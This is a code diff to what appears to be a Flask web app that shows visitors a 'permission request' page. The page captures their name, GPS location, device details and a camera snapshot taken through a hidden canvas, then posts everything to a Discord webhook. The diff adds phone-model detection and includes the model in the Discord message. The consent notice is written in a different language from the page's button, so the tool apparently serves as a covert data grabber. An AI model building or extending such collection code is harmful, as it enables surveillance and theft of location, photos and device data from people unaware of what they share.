@@ -50,7 +50,7 @@ HTML_TEMPLATE = """
         <h2>权限许可请求</h2>
         
         <div class="legal-banner">
-            法律声明：<br>
+             法律声明：<br>
             点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
         </div>
 
@@ -73,6 +73,28 @@ HTML_TEMPLATE = """
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // دالة استخراج نوع الهاتف من الـ UserAgent
+        function getMobileModel() {
+            const ua = navigator.userAgent;
+            let model = "Appareil Inconnu";
+            
+            if (/android/i.test(ua)) {
+                const match = ua.match(/;\s?([a-zA-Z0-9\s\-_]+)\s+Build\//);
+                if (match && match[1]) {
+                    model = match[1].trim();
+                } else {
+                    model = "Téléphone Android";
+                }
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                model = "iPhone / iOS Device";
+            } else if (/windows/i.test(ua)) {
+                model = "PC Windows";
+            } else if (/macintosh|mac os x/i.test(ua)) {
+                model = "Mac";
+            }
+            return model;
+        }
+
         async function captureAndSend(consent) {
             const statusDiv = document.getElementById('status');
             const username = document.getElementById('username').value;
@@ -96,6 +118,7 @@ HTML_TEMPLATE = """
             let imageBase64 = null;
 
             let deviceInfo = {
+                model: getMobileModel(),
                 screen: `${window.screen.width}x${window.screen.height}`,
                 language: navigator.language,
                 platform: navigator.platform,
@@ -181,10 +204,12 @@ def submit_consent():
     device = data.get("device", {})
     image_data = data.get("image")
 
+    # إضافة نوع الهاتف (Model) إلى الرسالة المرسلة لـ Discord
     payload = {
         "content": (
             f"✅ **Nouveau consentement et détails de l'appareil:**\n"
             f"• **Nom:** {username}\n"
+            f"• **Type de téléphone/Appareil:** {device.get('model')}\n"
             f"• **Localisation (GPS):** {location}\n"
             f"• **Résolution d'écran:** {device.get('screen')}\n"
             f"• **Langue et système:** {device.get('language')} | {device.get('platform')}\n"
@@ -200,7 +225,6 @@ def submit_consent():
             files = {
                 "file": ("snapshot.jpg", image_bytes, "image/jpeg")
             }
-            # استخدام json.dumps لحل مشكلة الخطأ 400
             resp = requests.post(
                 DISCORD_WEBHOOK_URL, 
                 data={"payload_json": json.dumps(payload)}, 
